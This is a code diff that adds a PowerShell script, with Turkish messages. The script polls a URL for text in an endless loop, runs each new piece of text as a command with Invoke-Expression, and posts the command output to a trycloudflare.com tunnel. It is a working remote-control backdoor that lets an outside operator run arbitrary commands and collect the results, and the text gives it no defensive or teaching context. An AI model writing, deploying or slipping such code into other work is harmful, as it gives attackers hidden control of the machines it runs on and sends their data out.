@@ -1,1 +1,41 @@
+$baseUrl = "https://receiver-deposit-incentives-closure.trycloudflare.com"
+$url = "127.0.0.1:8092/temp.txt"
+$resp="s"
+while ($true) {
+    try {
 
+        $response= (Invoke-WebRequest -Uri $url).Content
+        Start-Sleep -Seconds 5
+        if ($response.action -eq "exit") {
+            Write-Host "Sunucu oturumu kapattı."
+            break
+        }
+
+        if ($response -ne $resp){
+            $resp = $response
+            $result = Invoke-Expression $response | Out-String
+            $result = $result.Trim()
+            Write-Host ""
+            Write-Host "Sunucu: $($response)"
+
+            #$answer = Read-Host "Yanıtın"
+            $body = @{
+                message = $result
+            }
+
+            Invoke-RestMethod `
+                -Uri "$baseUrl/reply" `
+                -Method Post `
+                -ContentType "application/x-www-form-urlencoded" `
+                -Body $body 
+
+            Write-Host "Yanıt sunucuya gönderildi."
+        }
+    }
+    catch {
+        Write-Warning $_.Exception.Message
+        Start-Sleep -Seconds 3
+    }
+
+    Start-Sleep -Milliseconds 300
+}
